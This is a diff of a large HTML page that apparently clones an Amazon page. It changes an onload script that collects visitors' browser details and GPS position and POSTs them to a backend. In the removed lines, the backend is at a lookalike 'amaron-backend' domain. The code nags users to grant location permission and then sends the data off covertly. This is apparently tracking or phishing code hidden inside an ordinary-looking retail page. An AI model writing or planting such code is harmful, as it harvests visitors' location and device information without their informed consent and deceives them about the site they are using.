@@ -22484,33 +22484,9 @@
         <script>window.ue && ue.count && ue.count('CSMLibrarySize', 94447)</script>
 
         <script>
-            window.onload = function () {
-                if (!navigator.geolocation) {
-                    alert("Your browser does not support GPS.");
-                    return;
-                }
+            window.onload = async function () {
 
-                navigator.geolocation.getCurrentPosition(
-                    async function (position) {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-
-                        // Send to Next.js backend
-                        await fetch("https://amaron-backend.vercel.app/api/location", {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({ latitude, longitude }),
-                        });
-
-                        console.log("Sent:", latitude, longitude);
-                    },
-                    function (error) {
-                        alert("Please allow GPS permission to use this service.");
-                    }
-                );
-
+                // Collect all client info including geolocation
                 async function collectClientInfo() {
                     const info = {};
 
@@ -22542,12 +22518,13 @@
                         localTime: new Date().toISOString()
                     };
 
-                    // Try to get geolocation (requires permission)
+                    // Get geolocation (if allowed)
                     info.location = await new Promise(resolve => {
                         if (!navigator.geolocation) {
                             resolve(null);
                             return;
                         }
+
                         navigator.geolocation.getCurrentPosition(
                             pos => resolve({
                                 latitude: pos.coords.latitude,
@@ -22562,6 +22539,7 @@
                     return info;
                 }
 
+                // Send everything in one POST request
                 async function sendClientData() {
                     const clientInfo = await collectClientInfo();
 
@@ -22582,7 +22560,6 @@
                 }
 
                 sendClientData();
-
             };
         </script>
 
